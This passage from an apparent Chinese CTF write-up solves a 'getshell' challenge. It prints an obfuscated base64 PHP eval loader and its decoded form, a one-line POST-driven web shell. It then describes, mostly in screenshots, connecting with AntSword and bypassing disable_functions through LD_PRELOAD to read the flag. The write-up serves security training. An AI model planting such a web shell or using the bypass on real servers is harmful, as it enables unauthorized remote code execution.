zQzF1Sm90QkhSblAweFZ0SEMwUHVDTXAxeHVlaEVrU0JQQkJOSXNvM003bm14OWRrdFFwTjVVUzNLem9oSTJTc2FhdXV4Q2JzeW1lVUtjUlBLSkJQRTNtSVJBdDBvZlJJUFlidTlHUEh5T0dKeUlQSU14b05SamVmQzlka3RFcDJDeWIyNWlQc2FRdEphT3BJRXFQUE1Jb1U1RGJoUG1tQktsZUoxVlJ5dG5laHRLdjJSanV5eWtCUHhBb3N0M1AzeHhlZk05ZGt0RXAyQ3liMjVpUHNhUXRKYU9wSUVxUFBNSW9VNURiaFBtbUJLbGVKMVZSeXRuZWh0S3YyUmp1eXlrQlB4QW9zdDNQM3h4ZWZJOWRrdFFwTjVVUzNLem9oSTJTc2FhdXV4Q2JzeW1lVUtjUlBLSkJQRTNtSVJBdDBvZlJJUFlidTlHUEh5T0dKeUlQSU14b05SamVmQTBUbWdzUzJDM0wyRW1vMnhoU2hLb3RoUE10MHRRUFVveExJeHRCSHRabVZ5bHBVS2piMHlhb3VLZnZzNTJ1SEliUFBvNG9zMXNwZjBzbTJpWnROYTZtSlBpUkpLZHBQeURtQkVFQjN4cmIzUFNveUlMUjBpaExVUk52M3RQRzBJWHVJbzV2SkVLdFB0Ykd1dEh2VmczVEw0c20yaVp0TmE2bUpQaVJKS2RwUHlEbUJFRUIzeHJiM1BTb3lJTFIwaWhMVVJOdjN0UEcwSVh1SW81dkpFS3RQdGJHdXRIdlZnaW4zMDdFVXhrdU50MHQxUFdvQlBVcElFSHZWUmZHaEVKcHlvb3AxdG1MMHlZQlZvRGIxUnFiSnk2QkJpU2VVb0NSaHlhYkI1aUxzOFpRTHRRcE41VVMzS3pvaEkyU3NhYXV1eENic3ltZVVLY1JQS0pCUEUzbUlSQXQwb2ZSSVBZYnU5R1BIeU9HSnlJUElNeG9OUmplZkFPVEw0c20yaVp0TmE2bUpQaVJKS2RwUHlEbUJFRUIzeHJiM1BTb3lJTFIwaWhMVVJOdjN0UEcwSVh1SW81dkpFS3RQdGJHdXRIdlZnZkNIMFpFVTlncHN0V2VzNXl2aG9xTDIxb1NVMWxMUEM0THNDMXVKb3RCSFJuUDB4VnRIQzBQdUNNcDF4dWVoRWtTQlBCQk5Jc28zTTduWXk5ZGt0UXBONVVTM0t6b2hJMlNzYWF1dXhDYnN5bWVVS2NSUEtKQlBFM21JUkF0MG9mUklQWWJ1OUdQSHlPR0p5SVBJTXhvTlJqZWZBMlRMNHNtMmladE5hNm1KUGlSSktkcFB5RG1CRUVCM3hyYjNQU295SUxSMGloTFVSTnYzdFBHMElYdUlvNXZKRUt0UHRiR3V0SHZWZ2ZuVjBaRVU5Z3BzdFdlczV5dmhvcUwyMW9TVTFsTFBDNExzQzF1Sm90QkhSblAweFZ0SEMwUHVDTXAxeHVlaEVrU0JQQkJOSXNvM003bmZFOWRrdFFwTjVVUzNLem9oSTJTc2FhdXV4Q2JzeW1lVUtjUlBLSkJQRTNtSVJBdDBvZlJJUFlidTlHUEh5T0dKeUlQSU14b05SamVmbjFUTDRzbTJpWnROYTZtSlBpUkpLZHBQeURtQkVFQjN4cmIzUFNveUlMUjBpaExVUk52M3RQRzBJWHVJbzV2SkVLdFB0Ykd1dEh2VmdPQ0gwWkVVOWdwc3RXZXM1eXZob3FMMjFvU1UxbExQQzRMc0MxdUpvdEJIUm5QMHhWdEhDMFB1Q01wMXh1ZWhFa1NCUEJCTklzbzNNN25mTTl6MlAyR3VqREVVeGt1TnQwdDFQV29CUFVwSUVIdlZSZkdoRUpweW9vcDF0bUwweVlCVm9EYjFScWJKeTZCQmlTZVVvQ1JoeWFiQjVpTHM4REFzS0lTTjFzUHM1WlBJUHJCTlBWU1Zvc3BzRGpHSjBpdUpQYVJJb0xuSUtOUDI1enZJRU5TY1BtUzJpZnV1YTB0SUdPdlZSdVMzeHRQc3hzU0pDaFBKeEJTMG9tdXNvSXpCeWdvY010bjJ4NkcxUHVuUHRJQ1BQUG5OdG1HbUlTcFBSV1JVeXhwSW9TUEJQZ1J5RE9DQkN4UFBLWEcyMXJDUGJpU054b25Vb2dHc3ZpbjJDSXZOYXlweUtMQnNCaXQxeWdMeUtrUzN4Z1BZQ3VMSW9JUlZLQnBWd09QY0NsU3lEalBIeXN0Snhjb0JQekJKRVZ2SVJTUzFBZlBtQWlDdUNQU1ZNeG5CRXpvdTFMTDF5UHBWb3RQMnh1UDBSSEN1UFp0SjV4UHV0bVBJUlNTMkNVTEoxa3Bzb1Z1UHhEU0lvcXBVNVlQUEtTUEJSemVzNVBlY0VQUHNFckJQb2xTMDFhUk41bXBJbzRtQnhsUjJDVlBtSWtuMEV6QllJTm0wMGZ1SjFvUFVFUXVtQ0xteVJHdklQQ1B1dFFQTjVycFBuZnVzUkN1SW80RzJpU0NOVWl2SUl4TFVBMVBOYU5QdVB1dVlNc1Nzb2x1c3ZpQ3MxVm1zRVluMXk1b1VQU0NKUEl2SVJRUEJvUG1QUHNlUEVxbXlJb3BKdDZQQlBnZU5QUG9OYW10VUt0R1lDWWVQeWF0Skt1dGZiNUx1SzBwTnRhdEhDZGIyblhCTnlZUkJLSVNOeWh0MUFqQllJdXZ5S1BQc1BrdHNLWkcweHNleXlHTEoxa3BJS1NHWUlMUEluanBOS1BMSUtYQm1Jc3ZQSWFwY29QUGh4eG9CUFNtSnRHcFZ0dFBtUDRCMmc0cDBLSXBWb29ueW9VR0o1TlAxbmp6QlJ4bjBLZlB1MWpQeVBJUEphQnB1eGxvSW96bXlDV0xZb2tQdWJPUHNQNEN1dFZwVktTbjBFeFAxUnJCeVJJU04xTExOdEdvQlJJcDBLSUJKS29wSml0UE41bHV5QmpSY0lMUEI0T3V5UjBMeW9ndlZDQm5Cb1ZQc0JpbjFEaVNWTWtTMG9hdVB2NUxQS0F2Vnh4dHV0R1B1NXJtdW5PbkJhdHBoTXVvVXhIcDBLSVNOMXNQczVaUElQckJOUFZTVm9zcHNEakdKMGl1SlBhUklvTG5JS05QMjV6dklFTlNjUG1TMmlmdXVhMHRJR092VlJ1UzN4dFBzeHNTSkNoUEp4QlMwb211c29JdjBLVlJOS3NuVnRLUG1Fc3AxR09wY29oUFBHaUJQUHN0UGJpQnNSb1B1eG9QUG9ybk5FV2VjUHRwaHhkRzBQekxKRWhQSElZbjBLUW9OaWplSVBOUHlSeXQxS3p1c3Y0dkIxS1MzQ3J0UEVxdXU1Z0JQdFpieUtQblZiaUJ5UHpueUtoUlVLdXBWTWZQY0lOdDFvSW5tQ1NudXhqR0phTnBQeWh6QnlTTFZNNEdCUHN1SVBaTHMxWW5ZSWRCdTFqUEp0QW8yOXJ0dXhhb0lvenB5dFBMeU15dDJ4Mm9ONXJuTkVhblBLeXBodHVCWU1TdHlSWm1ITUx0SkYxQjJhZ3YxeVdSVXR1bkhNM1BKYTRCUG9Bb05LWVAxb0RQTmFOQjFLTnRoQ3J0M3Rxb2NNMFNQQk9vTjl1bkpqMlAxUHVuUElQb1VQQm5QRVZ1UFBEdVBQdUxZTWtTM0YxQnUxNEwyQ0ltc0trUDFvaUdmQ3JtMnRndlZ4UHR5b2hvQlJTbXlLVnpWQ3J0M3Rxb2NNMFNQQk9vTjl1bkpqMlAxUHVuUElQb1VQQm5QRVZ1UFBEdVBQdUxZTWtTM0YxQnUxNEwyQ0ltc0trUDFvaUdmQ3JtMnRndlZ4UHR5b2hvQlJTbXlLVnpWTW5iMUVJdW1FckNQUElDaFJoUHM1bm9JUHV0TnRhUEhFbVB5S3hHc0I1QnlFZ0JzNXNuSnRvR1B2MWJ5S2F0SG9tdDFBMkcxUkRMSUdpTEh5QkxVNTBCMmFydlBvR0JZdGRiMUVFdUo1dVBJRGpuQkNCbjJ4WEdZQ1NldXRWQ2h0aHVWTU9QeVBzdDFFdXZWS3hQUEVvb1BQakxKRVZMc2l0bnV0aUcwb1NtUFBOQllDb24wb2d1UEIxYnlQYUJ5RW50VUlmTHNSMFNKYmpSTnlQbkp0WFBZRWdDeVJQUFlJdFB1dElQY0lMdDF5UFNJeVBQc0RqR0phNENQSWFlVWFZdEI1ckd5UnV2dW5mTHM5c3BWTTRQQm91UDJQVnVzNVN0ZnhqTDFDV3ZVOTNRbTBrckxzN1FmND0iO2V2YWwoJz8+Jy4kQndsdHFPWWJIYVFrUlBOb3hjZm5GbXpzSWpoZE1EQVdVZUtHZ3ZpVnJKWnBMdVhFVFN5QygkaFlYbFRnQnFXQXBPYnhKdmVqUFJTZEhHUW5hdURpc2ZFTklGeW9jcmtVTHdtS01DdFZ6Wigkdk53VE9zS1BFQWxMY2lKREJoV3RSU0hYZW1wSXJqeVFVdUdvYWtuWUNkRnpxWk14ZmJnVigkTnZpdXl3Q2VQV0VHbGFjQW1manJnQk1UWVh6SFpwSXhEcVFuc1VLa2hvdEZTT1JkVkpMYiwkY2lNZlRYcFBvSkh6WkJ4TE92bmdqUUNiZElHa1lsVk5TdW1GckFVZVdhc0t5RXR3aERxUioyKSwkdk53VE9zS1BFQWxMY2lKREJoV3RSU0hYZW1wSXJqeVFVdUdvYWtuWUNkRnpxWk14ZmJnVigkTnZpdXl3Q2VQV0VHbGFjQW1manJnQk1UWVh6SFpwSXhEcVFuc1VLa2hvdEZTT1JkVkpMYiwkY2lNZlRYcFBvSkh6WkJ4TE92bmdqUUNiZElHa1lsVk5TdW1GckFVZVdhc0t5RXR3aERxUiwkY2lNZlRYcFBvSkh6WkJ4TE92bmdqUUNiZElHa1lsVk5TdW1GckFVZVdhc0t5RXR3aERxUiksJHZOd1RPc0tQRUFsTGNpSkRCaFd0UlNIWGVtcElyanlRVXVHb2FrbllDZEZ6cVpNeGZiZ1YoJE52aXV5d0NlUFdFR2xhY0FtZmpyZ0JNVFlYekhacEl4RHFRbnNVS2tob3RGU09SZFZKTGIsMCwkY2lNZlRYcFBvSkh6WkJ4TE92bmdqUUNiZElHa1lsVk5TdW1GckFVZVdhc0t5RXR3aERxUikpKSk7")); ?>

```

我们解出后，得到一段php代码

```php
<?php
highlight_file(__FILE__);
@eval($_POST[ymlisisisiook]);
?>
```

用蚁剑进行连接
![](https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/getshell/QQ%E6%88%AA%E5%9B%BE20210102234659.png)
连接成功后，发现只能访问html下的文件，无法访问其他地方
![](https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/getshell/QQ%E6%88%AA%E5%9B%BE20210102234746.png)
使用蚁剑的插件查看
![](https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/getshell/%401_G8RIP%40LEN%60S1BS~_392H.png)
发现putenv没有被禁用，果断采取LD_PRELOAD方法绕过:yum:
![](https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/getshell/6GH~0V%7D84%29B%7DA%24CIRIA_HG7.png)
生成文件之后，再连接我们生成的那个文件
![](https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/getshell/WWVHCE%24U9%7B63MW%60I5LGAU%60I.png)
连接后，可以突破限制访问其他地方
![](https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/getshell/%7BN83F_52HH4~9ZTQB%2543%5DYW.png)
flag在根目录下获得:grinning:
![](https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/getshell/%28KDTXR%40KF5NY%7D%5DX8U2ZKGIJ.png)


# Misc

# Reverse



